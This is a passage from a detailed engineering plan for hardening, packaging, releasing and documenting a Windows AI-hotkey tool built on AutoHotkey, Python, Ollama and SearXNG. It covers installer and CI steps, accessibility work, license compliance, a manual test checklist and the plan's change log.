  1. **C18.**
     - `OnExit` kills `currentPid`, except on `"Single"`, where the new instance owns cleanup. Document this.
     - Tray Reload and Exit ask for confirmation while `busy`.
  2. **C20.** Read the K5 pid file. Before calling `ProcessClose`, verify that the process's executable path equals the configured `PYTHON` and that its creation time matches. Accept the legacy pid format, but then require the path match.
  3. **C28.** Launch Python with `-E -s`. Add `-B` only if S11 has not solved stale bytecode some other way. Wrap `FileOpen` and `FileDelete` in `try` with a clear message.
- **Acceptance criteria:**
  - A Reload during a job leaves no orphan process (`Get-Process pythonw`).
  - A stale pid file pointing at an unrelated `python.exe` does not kill it.
  - With PYTHONPATH and user-site packages set to a poisoned module, the bundled interpreter does not load them.
  - The behaviour in I5, I9 and I10 is unchanged.
- **Validation:** `/validate`, `tests\ahk\run.ahk`, and §7.2 items 7, 9 and 10.
- **Rollback:** revert.
- **Exit:** reviewer sign-off.

### Step S8b3 — `main.ahk`: error surfacing and UX
- **Wave:** E. **Depends on:** S8b2, S4 (K1, K6, `actions/health.py`, `prompt_loader`). **Model:** default. **Branch:** `prod/s8b3-ahk-errors`
- **Agents:** `ecc:silent-failure-hunter`, `ecc:code-reviewer`. **Skill:** `error-handling`.
- **Owns:** see §5.1, serially.
- **Fixes:** C06 (AHK side), C26, C27, C41 (only if the S3 numbers justify it). Wires the H24 health check and the D4 "Edit prompts" target.
- **Tasks:**
  1. **C06.** Delete `work/error.txt` before each run. When the output is missing, show its line 1. Show `work/config_warning.txt` once after each reload.
  2. **C26.** Detect duplicate keys when registering, and show one warning toast. Label keys by their actual registration state.
  3. **C27.**
     - Release `busy` before any MsgBox, or use non-modal error toasts that stay at least 6 s.
     - Make `Flash` re-show the progress toast afterwards.
  4. **C41.** Replace the post-`^s` `Sleep 500` with a file-mtime check (2 s timeout), and lower the post-`^v` sleep to a measured floor. Do this only with S3 before/after numbers.
  5. **Health check.** At startup, run `actions/health.py` once in the background. If Ollama or the model is missing, show a toast with the K1 message.
  6. **"Edit prompts" (D4).** Open `prompts_user.py`, creating it from a commented template if it is absent. It is never `prompts.py`.
- **Acceptance criteria:**
  - Each K1 scenario shows its specific message.
  - With a duplicate key, a warning is shown.
  - While an error is displayed, the hotkeys still work.
  - The §7.2 items 5, 11 and 12 pass.
- **Validation:** `/validate`, `tests\ahk\run.ahk`, and §7.2.
- **Rollback:** revert.
- **Exit:** reviewer sign-off.

### Step S9 — `work/` contract hardening, privacy and error mapping in the viewer
- **Wave:** F. **Depends on:** S4, S6b, S7, S8b3. **Model:** strongest. **Branch:** `prod/s9-work-contract`
- **Agents:** `ecc:silent-failure-hunter`, `ecc:security-reviewer`.
- **Owns:** see §5.1.
- **Fixes:** C32, C21, H04 (if S3 confirmed it), and the orphan-overwrite part of C18.
- **Tasks:**
  1. **Per-run directories.**
     - AHK creates a random run id. Python receives it (as an argument or environment variable) and writes the outputs atomically to `work\runs\<id>\`. AHK and the viewer read from there.
     - The viewer also accepts the old argument form (K3, backward-compatible).
  2. **Cleanup.**
     - The viewer deletes the input and output files once it has loaded them.
     - AHK deletes the run directory after a successful replace.
     - A startup sweep deletes run directories older than 1 hour.
     - Esc cleanup removes the run directory (I5).
  3. **Permissions.** Restrict `work\` to the current user with a best-effort ACL at first run.
  4. **C21.** In the viewer, map exceptions through `qwen_client.describe_error` (K1). That gives the 404 → `ollama pull` message.
- **Acceptance criteria:**
  - After a successful PgDn, no plaintext selection remains in `work\` once the viewer has loaded. A fake-Ollama test checks this.
  - The H04 scenario shows correct pairs.
  - An orphan writing late cannot affect a newer run.
  - I5 and I7 still pass.
- **Validation:** `python -m unittest tests.test_work_contract -v`, plus §7.2 items 2, 3, 7, 8 and 11.
- **Rollback:** revert. The old argument form keeps working.
- **Exit:** `docs/changes/pending/S9.md` documents the privacy behaviour.

### Step S10 — UI/UX and accessibility of the local pages
- **Wave:** D. **Depends on:** S7, D5, D8. **Model:** default. **Branch:** `prod/s10-ui-a11y`
- **Agents:** `ecc:a11y-architect`. **Skills:** `accessibility`, `frontend-a11y`. **Tools:** the chrome-devtools MCP `lighthouse_audit` and `take_snapshot`.
- **Owns:** see §5.1. Inserted after S7 merges: the `settings.py` `CHOICES` entry for `query_mode` (a one-line §8 insert).
- **Fixes:** C34, C40, and the UI part of C33. **Verifies:** H21.
- **Tasks:**
  1. **Hotkey recorder.**
     - Give it an accessible name that includes the action.
     - Add a polite live region announcing "listening", the key that was set, and errors.
     - Set `aria-invalid` and `aria-describedby` on errors.
     - Give each "Default" button a unique name.
     - Block Shift+Tab, Ctrl+C, Ctrl+V and Alt+F4 as recorded keys. Plain Tab always leaves the recorder.
  2. **Streaming answers.**
     - Give the answer a status role, and announce "Answer ready" when it finishes.
     - Use `readonly`/`aria-disabled` instead of `disabled`, and do not blur the field on Esc.
     - Show errors with `role="alert"`, and mark a K4 partial answer as incomplete.
     - Throttle `rerender` to at most once per 150 ms, with a single final render (C40).
  3. **Contrast.** Raise borders and the selected state to at least 3:1. Add a non-colour selected indicator, `forced-colors` rules, and swatches that follow the theme.
  4. **Layout.** Add `scroll-padding-bottom`. Make the dock and the save bar static at small sizes. Give the composer textarea `min-width:0`.
  5. **Markup.** Label the `aside` and put the result first in the DOM. Mark the settings preview `aria-hidden`. Give each citation an `aria-label`.
  6. **UX.**
     - Show a "disconnected — reopen from the hotkey" banner when the ping fails or after F5.
     - Settings validation messages state the expected format.
     - Render the non-loopback `ollama_url` warning from S7.
     - Add the web-search egress notice and the `query_mode` choice (D5).
  7. **Titles.** Keep the `<title>` patterns `… - AI-Hotkeys` and `AI-Hotkeys Settings`, which S8b1 relies on.
- **Acceptance criteria:**
  - Lighthouse accessibility scores at least 95 on both pages, in the dark and light themes.
  - The recomputed contrast table has no 1.4.3 or 1.4.11 failures.
  - A keyboard-only walkthrough passes.
  - The NVDA spot check is recorded (H21).
  - On a 20k-token streamed answer, frames stay under 50 ms in a DevTools trace, before vs after.
  - I7 and I8 are unchanged.
- **Validation:** `lighthouse_audit`, a manual NVDA run, and the S7 HTTP tests still green.
- **Rollback:** revert the static files.
- **Exit:** before and after reports attached.

### Step S11 — Reproducible build pipeline
- **Wave:** A. **Depends on:** D2. It can start with the payload layout while D2 is pending. **Model:** default. **Branch:** `prod/s11-build`
- **Agents:** `general-purpose`. **Skills:** `deployment-patterns`, `github-ops`.
- **Owns:** see §5.1.
- **Fixes:** C07, and the runtime part of C28. **Verifies:** H16 and H17. H17 is done first here, because the build pins SearXNG.
- **Context brief:**
  - `installer.nsi` expects `payload\{app,python,ahk,config.ini}`. That folder is gitignored and no script builds it.
  - The shipped v1.0.0 payload also contained `searxng\{app,lib,…}`.
  - Vendored versions in that payload:
    - SearXNG `2026.10.7+6671d89`
    - AutoHotkey 2.0.19
    - CPython 3.13.7 (trimmed)
    - cp313 wheels in `searxng/lib`
- **Tasks:**
  1. **H17.** Diff the vendored `searxng/app/searx` against upstream `6671d89`. If it is modified, record the patch, so it can be carried and AGPL-disclosed.
  2. **Version and pins.**
     - `VERSION` is the single source of the version number.
     - `build/pins.json` holds URL and SHA-256 pins for: the Python embeddable zip (latest 3.13.x), the AutoHotkey 2.0.19 zip, the full SearXNG SHA and NSIS 3.11 portable.
  3. **SearXNG dependencies.** `build/requirements-searxng.txt` is generated with `pip-compile --generate-hashes` from SearXNG's requirements at the pin, plus `curl_cffi`. Install it with `--only-binary=:all: --platform win_amd64 --python-version 3.13 --target … --require-hashes --no-compile`.
  4. **`build/build.ps1`** (PowerShell 5.1):
     - Require a clean tree, then download and verify all pins.
     - Assemble `payload\` from an **explicit allowlist**: root `*.py` except tests, `main.ahk`, `lib/`, `actions/`, `static/`, `icon.ico`, the `searxng/` wrapper together with the vendored SearXNG, `config.example.ini`, `LICENSE`, `THIRD_PARTY_NOTICES.md` and `licenses/`. Copy `config.example.ini` to `payload\config.ini`.
     - Write `python313._pth` per D2.
     - Write `build/out/manifest.txt` (path and SHA-256) and `build/out/uninstall.nsh`.
     - Run `makensis /DVERSION=…` and write `SHA256SUMS.txt`.
     - `-AllowMissingNotices` lets the build run before S12 merges. It is never used for a release.
  5. **Smoke test** with the payload's interpreter:
     - Import every app module, including the SearXNG launcher. The H16 check must confirm that `..` on the path causes no name-shadowing, e.g. root `settings.py` vs any `settings` module SearXNG imports.
     - Start `avvia_searxng.py --port <free> --work-dir <temp>` (S6c), wait for `/healthz` (60 s), then kill it.
- **Acceptance criteria:**
  - Two builds from the same commit on two machines produce the same `manifest.txt`. Record whether the `.exe` itself is byte-identical.
  - The build fails on any hash mismatch.
  - The payload contains no developer `config.ini` (its hash must equal the example's), no `work/`, `__pycache__`, `tests/`, `plans/`, `pyproject.toml` or `.git*`.
  - H16 and H17 are recorded.
- **Validation:** `powershell -NoProfile -ExecutionPolicy Bypass -File build\build.ps1 -SkipInstaller`, then a full build and a manifest comparison.
- **Rollback:** the step is additive.
- **Exit:** manifest attached.

### Step S12 — Third-party license compliance
- **Wave:** A. **Depends on:** none. The notice-to-manifest check becomes blocking once S11 has merged. **Model:** default. **Branch:** `prod/s12-licenses`
- **Agents:** `general-purpose`, `ecc:opensource-sanitizer` (cross-check). **Skill:** `opensource-pipeline` (sanitizer stage only).
- **Owns:** see §5.1.
- **Fixes:** C29 (documentation side).
- **Tasks:**
  1. **`THIRD_PARTY_NOTICES.md`.** Cover:
     - AutoHotkey 2.0.19 (GPLv2), with its source zip attached to each Release
     - SearXNG `6671d89` (AGPL-3.0-or-later), with its modification status from S11/H17 and a source tarball attached to each Release
     - CPython (PSF, plus the licenses of its bundled libraries)
     - curl_cffi (MIT), plus the libcurl-impersonate components with their full notices: curl, BoringSSL, nghttp2, brotli, zstd, zlib
     - every package in `searxng/lib`
     - marked 12.0.2 (MIT)
     - the Barlow and IBM Plex fonts (OFL-1.1)
     - Ollama and the Qwen model: not redistributed; link to their terms and the model license
  2. **License texts.** Put the full texts in `licenses/`.
  3. **Tooling.** `tools/licenses/gen_notices.py` builds the package list from dist-info metadata. `tools/licenses/check_notices.py <manifest>` fails if a redistributed binary has no notice.
- **Acceptance criteria:**
  - Once S11 has merged, `check_notices.py` passes against the manifest.
  - The source-offer mechanism is implemented in S14 (archives attached to the Release).
  - The notices carry a "not legal advice" note, and the user has reviewed them.
- **Validation:** `python tools/licenses/check_notices.py build/out/manifest.txt`.
- **Rollback:** documentation only.
- **Exit:** user review recorded.

### Step S13a — Installer: location, permissions and legacy migration
- **Wave:** C. **Depends on:** S11, S12, D1, D2, D11. **Model:** strongest. **Branch:** `prod/s13a-installer-location`
- **Agents:** `general-purpose` (author), `ecc:security-reviewer` (review). **Skill:** `deployment-patterns`.
- **Owns:** see §5.1, serially.
- **Fixes:** C09. Covers the v1.0.0 upgrade (D11).
- **Tasks:**
  1. **C09 / D1.**
     - The default install folder becomes `$LOCALAPPDATA\Programs\AI-Hotkeys`.
     - `.onVerifyInstDir` rejects folders containing `.git`, the root of the system drive, and folders that are not writable.
     - A custom folder outside the user profile gets an explicit ACL: `icacls /inheritance:r`, granting only the user, SYSTEM and Administrators.
  2. **D11 legacy migration.**
     - Commit `legacy-1.0.0.manifest`, derived from the decompiled v1.0.0 installer. It must include `config.esempio.ini`, the Italian shortcut names (e.g. `Disinstalla.lnk`) and the `searxng\` folder.
     - When the old `InstallDir` differs from the new one, run the migration only with the user's consent:
       - stop the old instance with `stop.ps1` (§S13b)
       - copy `config.ini`
       - rename the old `Uninstall.exe` to `Uninstall.exe.disabled-by-<ver>`, so running it cannot remove the new install's registry keys and shortcuts
       - delete the old Start-menu and Startup shortcuts
       - leave the old folder in place, and tell the user they can delete it
     - When v1.0.0 is upgraded in place, apply the legacy manifest to remove the stale files.
- **Acceptance criteria** (checked in CI by S14 and on VMs by S16):
  - A fresh install has no write access for Users or Authenticated Users on its folder.
  - Upgrading v1.0.0 → new, in place and with migration, leaves no `config.esempio.ini`, no Italian shortcuts and no second running `main.ahk`.
  - The modified `config.ini` is preserved.
- **Validation:** S14 jobs and Windows Sandbox. **Never run this against `C:\AI-Hotkeys`.**
- **Rollback:** revert. The previous installer stays available.
- **Exit:** security-reviewer sign-off.

### Step S13b — Installer: manifest-driven uninstall, Ollama checks, metadata
- **Wave:** D. **Depends on:** S13a, D4. **Model:** strongest. **Branch:** `prod/s13b-installer-uninstall`
- **Agents:** `general-purpose`, `ecc:security-reviewer`.
- **Owns:** see §5.1, serially.
- **Fixes:** C08, C29 (wiring), C30, C31, C44, C45.
- **Tasks:**
  1. **C08 / C30: manifest-driven install and uninstall.**
     - Generate the uninstall list from `build/out/uninstall.nsh`.
     - Store the current manifest as `$INSTDIR\.manifest`. On upgrade, remove files that are in the old manifest but not the new one. Also purge `__pycache__`.
     - Never touch `config.ini`, `work\`, `prompts_user.py`, `prompts.py.bak-*` or the user's backups.
     - On upgrade, if `prompts.py` differs from the shipped hash of the previous version, keep it as `prompts.py.bak-<ver>` (D4).
  2. **C31: winget.**
     - In `${Silent}` mode, never open a browser.
     - Add a `/NOOLLAMA` switch.
     - Check that winget is present before using it.
     - Show the user that installing Ollama through winget accepts Ollama's terms.
     - Check winget's exit code.
  3. **C44: Ollama detection.**
     - Look for Ollama in its known paths first. Run `where` only with `$SYSDIR` as the working directory.
     - Check that the model is present via the manifest path or `http://127.0.0.1:11434/api/tags`.
     - Tell the user apart "server not running" and "model missing".
  4. **C29: license and metadata.**
     - Add an MIT license page.
     - Install `LICENSE`, `THIRD_PARTY_NOTICES.md` and `licenses/`.
     - Set `LegalCopyright` to "© 2026 AI-Hotkeys contributors — MIT".
     - Set VIProductVersion and ProductVersion from `/DVERSION`.
     - Set CompanyName, EstimatedSize, URLInfoAbout, HelpLink and QuietUninstallString.
  5. **C45: `stop.ps1`.**
     - Match paths with a trailing separator.
     - Also stop Python processes whose command line references `$Dir`.
     - Report failures through the exit code.
     - Add a `/PURGE` uninstall switch.
  6. **Finish page.** Show VRAM guidance, the `ollama pull` hint, the web-search egress disclosure (D5) and where the Obsidian settings are.
- **Acceptance criteria:**
  - A silent install into a path with spaces works, and every shortcut resolves.
  - An upgrade leaves no stale files and keeps a modified `config.ini`.
  - The default uninstall leaves only `config.ini` and `work\`. `/PURGE` leaves nothing.
  - No browser opens in silent mode.
  - No processes are left running.
- **Validation:** S14 jobs and Windows Sandbox.
- **Rollback:** revert. The previous installer stays available as a release asset.
- **Exit:** the S14 jobs are green.

### Step S14 — Installer CI and draft-release workflow
- **Wave:** E. **Depends on:** S2, S13b, D6, D11. **Model:** default. **Branch:** `prod/s14-release-ci`
- **Agents:** `general-purpose`, `ecc:code-reviewer`. **Skills:** `github-ops`, `deployment-patterns`.
- **Owns:** see §5.1.
- **Verifies:** H14.
- **Tasks:**
  1. **`installer.yml`.** Runs on PRs that touch `installer/**`, `build/**`, `*.py`, `main.ahk`, `lib/**` or `static/**`, on `windows-2022` and `windows-latest`:
     - Build with downloads cached by the `pins.json` hash.
     - Silent install with `/S /NOOLLAMA /D=C:\Temp Dir\AI Hotkeys Test`.
     - Check the files, the registry, the `.lnk` targets and the ACL.
     - Smoke-import the app with the bundled Python.
     - Start the viewer and settings with `--no-browser`. Without the token, they must return 403.
     - SearXNG must pass `/healthz` within 60 s, on its default port inside the isolated CI VM.
     - Upgrade test from the v1.0.0 baseline asset (D11), when available, and from the previous CI artifact.
     - Uninstall with `/S`, then with `/PURGE`, and check what remains.
     - Upload the installer and `SHA256SUMS`.
  2. **E2E smoke job** (non-blocking, `continue-on-error`): start a fake Ollama on port 11434, start `main.ahk` and Notepad, send PgUp, and check that the text changed (H14).
  3. **`release.yml`.** Triggered by `workflow_dispatch` or a `v*` tag that equals `VERSION`.
     - Build, then create a **draft** release with: the Setup.exe, `SHA256SUMS.txt`, `third-party-sources/` (the AutoHotkey source zip and the SearXNG tarball, plus any H17 patch), and a build-provenance attestation.
     - Signing is optional and follows D6.
     - Only the user publishes.
- **Acceptance criteria:**
  - The installer jobs are green on both images.
  - A test-tag dry run produces a complete draft.
  - H14 is recorded.
  - **First-release rollback note:** v1.0.0 is not on GitHub, so rollback before the first GitHub release means "uninstall, then reinstall the local v1.0.0 Setup.exe". Document this in the release notes.
- **Validation:** Actions logs.
- **Rollback:** disable the workflows.
- **Exit:** a draft exists, but only if the user approved the test tag push.

### Step S15 — Documentation
- **Wave:** G. **Depends on:** S4–S10, S11, S12, S13a, S13b, S14. **Model:** default. **Branch:** `prod/s15-docs`
- **Agents:** `ecc:doc-updater`, `ecc:comment-analyzer`. **Skill:** `docs-governance`. **Commands:** `/ecc:update-docs`, `/ecc:update-codemaps`.
- **Owns:** see §5.1.
- **Fixes:** C42, and the documentation side of C33. Covers H25.
- **Tasks:**
  1. **README.**
     - Split it into "Install (Setup.exe)" and "Run from source (Python 3.13 x64, D9)".
     - Give one consistent requirements statement: Windows 10/11 x64; the ~6.6 GB model plus context, about 8 GB VRAM, 12 GB recommended; CPU fallback behaviour; disk space; Ollama minimum version (from S4); and the model, with a link to the model license.
     - Correct the tray item name to "Free VRAM".
     - Describe the new error messages and `prompts_user.py`.
  2. **`docs/INSTALL.md`:**
     - fresh machine setup and SmartScreen
     - installing Ollama and pulling the model
     - first run and the Obsidian settings, including a OneDrive-redirected Documents folder (H25)
     - migration from v1.0.0
  3. **`docs/TROUBLESHOOTING.md`:**
     - `work\error.txt` and `server.log`
     - `searxng.log`
     - port 8888 busy
     - model missing
     - antivirus or AV quarantine
  4. **`PRIVACY.md`:**
     - what stays local, and what is sent to search engines (C33, D5, `query_mode`)
     - the `work\` lifecycle (S9)
     - backups (S5, D3)
     - no telemetry
  5. **`SECURITY.md`:** the token model, the CSP, the SSRF policy and its residual risk, and how to report a problem.
  6. **Configuration reference.** A table of the Italian keys and values with their English meaning (I11). Add the new optional keys to `config.example.ini`, with comments: `query_mode`, plus `clip_wait_ms` if D12 introduces it.
  7. **User guide.** Track `docs/guide-it.md` (replaces the untracked `LEGGIMI.txt`, mojibake fixed). An English guide is optional.
  8. **Housekeeping.**
     - Write `CONTRIBUTING.md` (worktrees, `link-runtime.ps1`, tests, build, CI).
     - Write `CHANGELOG.md` from the `docs/changes/pending/*` fragments.
     - Regenerate the codemap.
     - Close the remaining `DELETION_LOG.md` items.
- **Acceptance criteria:**
  - Each README claim is checked against code or a test, with the list in the PR.
  - All links resolve.
  - `docs/changes/pending/` ends up empty.
- **Validation:** a link check, plus an `ecc:doc-updater` review against the code.
- **Rollback:** revert.
- **Exit:** merged.

### Step S16 — Fresh-machine release validation (release candidate)
- **Wave:** H. **Depends on:** all previous steps. **Model:** default. **Branch:** `prod/s16-rc`
- **Agents:** `ecc:e2e-runner`, `ecc:opensource-sanitizer`, `ecc:code-reviewer` (final). **Skills:** `windows-desktop-e2e`, `verification-loop`. **Command:** `/ecc:checkpoint`.
- **Owns:** see §5.1.
- **Verifies:** H15, H18, H24 (older Ollama), H25, H26.
- **Tasks:**
  1. **Clean VMs.** Prepare three:
     - Windows 10 22H2
     - Windows 10 LTSC 2021
     - Windows 11 24H2

     Each has a standard user, no Python and no AutoHotkey. Add one profile whose name contains a space and a non-ASCII character, one with OneDrive Known Folder Move enabled, and one with a non-Latin keyboard layout.
  2. **Run the full §7.2 checklist**, plus these cases:
     - winget absent
     - Ollama not running, model missing, and an older Ollama version
     - offline: everything except End's web search works
     - port 8888 already in use
     - upgrade from v1.0.0 (D11)
  3. **Antivirus and sanitizer.** With explicit user approval, upload the RC to VirusTotal. Record SmartScreen behaviour (H18). Run `ecc:opensource-sanitizer` on the release tree.
  4. **Checklist.** Fill in `docs/release/checklist-<ver>.md`. Any failure triggers the §8 insert protocol.
- **Acceptance criteria:**
  - The checklist passes 100% on all VMs, or each failure carries a user-approved waiver.
  - The sanitizer reports PASS.
  - A draft release is ready.
- **Exit:** the user publishes. Claude never publishes.

---

## 7. Validation suites

### 7.1 Automated (CI)

| Gate | Command | From step |
|---|---|---|
| Python unit/regression | `python -m unittest discover -s tests -t . -v` | S1 |
| Coverage ratchet | `coverage run --branch -m unittest discover -s tests -t . && coverage report --fail-under=<baseline>`. Targets by S9: at least 85% on `obsidian_todo.py`, `config_edit.py`, `pages.py` and `settings.py`; at least 70% on `qwen_client.py` and `viewer.py`; at least 60% on `websearch.py`. | S1, S2 |
| Lint | `ruff check .` | S2 |
| AHK syntax | `ahk\AutoHotkey64.exe /ErrorStdOut /validate main.ahk` (capture output per §0.6) | S2 (H13) |
| AHK unit | `ahk\AutoHotkey64.exe /ErrorStdOut tests\ahk\run.ahk` | S8a |
| Security corpus | `python -m unittest tests.test_viewer_http tests.test_settings_http tests.test_websearch_ssrf` | S6a, S7 |
| Secrets and hygiene | gitleaks; no tracked `config.ini`, `work/` or `*.exe` | S2 |
| Licenses | presence check plus `tools/licenses/check_notices.py build/out/manifest.txt` | S2, S12 |
| Build reproducibility | `powershell -NoProfile -ExecutionPolicy Bypass -File builduild.ps1`, then compare the manifests | S11 |
| Dependency vulnerabilities | `pip-audit -r build/requirements-searxng.txt` | S2, S11 |
| Install, upgrade and uninstall | `installer.yml` | S14 |

### 7.2 Manual Windows E2E checklist (before every release; Windows 10 and Windows 11)

1. **Install:** interactive and silent, into a path with spaces. Check the tray icon and tooltip, the startup shortcut, and the license page.
2. **Default keys** in Notepad, Notepad++, VS Code, Word and Obsidian: PgUp replaces the text (I6), PgDn opens the summary page, End opens the explanation page.
3. **Nothing selected:** PgUp, PgDn and End act natively with no stall, the clipboard is intact, and holding PgDn scrolls smoothly (C03).
4. **Non-editable app** (browser, Explorer): PgUp opens the results page. Consoles get no `^c`.
5. **Settings:**
   - Change the hotkeys (single key, Ctrl+Alt+R combo).
   - A duplicate key is rejected and an invalid key is rejected.
   - Shift+Tab is not captured.
   - The "Settings applied" toast appears and the new key works without a restart.
6. **Obsidian To-Do route:**
   - The reorganization works and a backup appears per D3.
   - A failed check leaves the file untouched.
   - An edit during the run aborts cleanly.
7. **Esc:** a 2 s hold cancels, kills Python and cleans `work\`. A short Esc still works in the app.
8. **Results page:**
   - Themes and colours work.
   - Follow-up questions stream and can be stopped.
   - Copy works.
   - Remote images are not loaded.
   - The idle shutdown happens at about 4 min (results) and 5 min (settings), and the disconnected banner appears.
9. **SearXNG:**
   - `auto` searches for technical text and skips a personal note.
   - `always` and `false` behave as named; with `false`, SearXNG never starts.
   - Citations work.
   - The "Open SearXNG" tray item works.
10. **VRAM:** the `keep_alive` values apply, and "Free VRAM" unloads the model (`ollama ps`).
11. **Errors:**
    - With Ollama stopped, a specific message appears.
    - With the model missing, a message tells you to run `ollama pull`.
    - A long selection gives the "cut off" message and no replace happens.
    - A malformed `config.ini` gives a warning toast, and the app keeps working with defaults.
12. **Display:** 125% and 150% scaling, and multiple monitors (toast position).
13. **Uninstall:** with the default answer, `config.ini` and `work` are kept. With `/PURGE`, nothing remains. No processes are left running.

---

## 8. Plan-mutation protocol

- **Split:** when a step exceeds about 600 changed lines or two reviewers flag it as too broad, split it into `Sx.1` and `Sx.2`, each with its own Owns/Acceptance/Validation. Update §5.1 and §5.2.
- **Insert:** when a hypothesis is confirmed and is not covered by an existing step, add it as a new `C` row and either assign it to an existing step whose Owns covers the file, or insert a step `Sx.y`.
- **Skip:** a refuted hypothesis is marked "refuted (evidence)" in §3.2, and its dependent tasks are removed with a one-line note.
- **Reorder:** allowed only when the file-ownership matrix stays conflict-free.
- **Abandon:** record the reason in this file. Leave the branch unmerged and do not delete it without user approval.
- Every mutation updates this file's header status line and adds an entry to the change log below.

### Change log
- 2026-10-16: initial draft from eight parallel audits; planner spot-checks for C01, C03, C05, C10, C11, C21, C28.
- 2026-10-16: adversarial review (findings R1–R25) applied:
  - Contracts K4–K6 added.
  - C04 title match fixed; corrections to C06, C22 and C41.
  - Steps split: S6 into S6a/b/c, S8b into S8b1/2/3, S13 into S13a/b.
  - S11/S12 cycle removed (H17 moved to S11, notice tooling moved to S12).
  - v1.0.0 migration added (D11); I15/D10 and D12 added; H24–H27 added.
  - Worktree, merge-gate and runtime-isolation rules added (§0.5, §1); Windows command conventions added (§0.6).
  - C21 moved to S9; the C01 test is now non-hanging; S15 dependencies widened.
- 2026-10-16: D1–D12 accepted with the recommended defaults. Wave A started: S1 in the planning session; S11 and S12 proposed as separate sessions.
- 2026-10-18: hypothesis results (S3, S6c, S8a, S11; evidence in docs/audit/baseline-2026-10.md and docs/changes/pending/):
  - **Confirmed:** H04 (fixed in S9), H08, H09 and H10 (fixed in S6c), H13.
  - **Refuted:** H01, H05, H16, H17 (SearXNG unmodified), H22, and H11 for first requests.
  - **H11, follow-ups:** follow-up questions in the viewer have no size guard (open). Ollama silently truncates past num_ctx.
  - **H23:** keep the query-decision call.
  - **Still open, manual:** H02, H03, H06, H07, H21.
  - **E1/D7:** streaming the first answer is recommended. TTFT is 0.12–1.1 s against 4–26 s for the full answer.
  - **Steps done:** S1–S8b3, S10–S13b.

---

## 9. Phase completion criteria

| Phase | Steps | Done when |
|---|---|---|
| Foundations | S1, S2, S3, S11, S12 | Tests and CI are green on `main`; the baseline document is merged; the build is reproducible (identical manifest); the notices are reviewed. |
| Correctness and security | S4, S5, S6a, S6b, S6c, S7, S8a, S8b1, S8b2, S8b3 | All C01–C28 and C35–C41 assigned to these steps are closed by tests (or by the manual checklist for the AHK-only items). The security corpus is green, and no HIGH or CRITICAL open findings remain from a re-run of `ecc:security-reviewer` and `ecc:silent-failure-hunter` on `main`. |
| Privacy and UX | S9, S10 | The privacy test is green; Lighthouse accessibility is at least 95; checklist items 2–8 pass. |
| Distribution | S13a, S13b, S14 | The installer CI is green on both images, including the path-with-spaces, upgrade and uninstall scenarios; the ACL check passes. |
| Docs | S15 | All README claims are verified and the pending fragments are merged. |
| Release | S16 | The fresh-VM checklist passes on all three VMs, the sanitizer reports PASS, the draft release is ready, and the user publishes it. |

**Overall completion:**
- Every C-row is closed or carries a user-approved waiver.
- Every H-row is resolved (confirmed and fixed, or refuted).
- All invariants I1–I14 pass in §7.
- A clean install of the published release succeeds on a fresh Windows 10 and Windows 11 machine, following only `docs/INSTALL.md`.
